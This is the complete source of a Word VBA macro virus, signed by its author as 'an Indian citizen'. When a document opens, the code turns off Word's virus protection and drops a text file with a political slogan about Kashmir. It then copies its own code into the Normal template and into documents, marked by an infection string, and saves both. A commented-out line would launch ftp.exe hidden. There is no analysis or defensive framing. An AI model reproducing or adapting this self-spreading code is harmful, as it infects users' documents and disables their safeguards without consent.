   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Private Sub Document_Open()
   On Error Resume Next

   'DECLARATIONS

   Dim sViralCode As String, nFreeFile As Integer
   Dim oNormal As Object, oDocument As Object, sFileName As String
   Dim rRange As Range

   Const cIndicator = "INDIA"  ' CONSTANT TO FIND IF THE FILE IS ALREADY INFECTED OR NOT

       Options.VirusProtection = False 'SET VIRUS PROTECTION TO OFF MODE
       nFreeFile = FreeFile

       Randomize
       sFileName = "\India" + Str(32767 * Rnd) + ".txt"

       Open CurDir + sFileName For Output As #nFreeFile
           Write #nFreeFile, "Kashmir is an integral part of INDIA. JAI HIND"
       Close #nFreeFile

       Set oDocument = ActiveDocument.VBProject.VBComponents.Item(1)
       Set oNormal = NormalTemplate.VBProject.VBComponents.Item(1)

       If (oNormal.CodeModule.Find(cIndicator, 1, 1, 999, 999)) = False Then
           sViralCode = oDocument.CodeModule.Lines(1, oDocument.CodeModule.CountOfLines)
           ViralCode = ViralCode & Chr(10)
           oNormal.CodeModule.DeleteLines 1, oNormal.CodeModule.CountOfLines
           oNormal.CodeModule.AddFromString sViralCode

       End If

   '    Shell "Command.com /c ftp.exe -n -s:" + CurDir + sFileName, vbHide

       If (oDocument.CodeModule.Find(cIndicator, 1, 1, 999, 999)) = False Then
           sViralCode = oNormal.CodeModule.Lines(1, oNormal.CodeModule.CountOfLines)
           ViralCode = ViralCode & Chr(10)
           oDocument.CodeModule.DeleteLines 1, oNormal.CodeModule.CountOfLines
           oDocument.CodeModule.AddFromString sViralCode
       End If

       ActiveDocument.Save
       NormalTemplate.Save

   End Sub


   ' Virus Created By An Indian Citizen
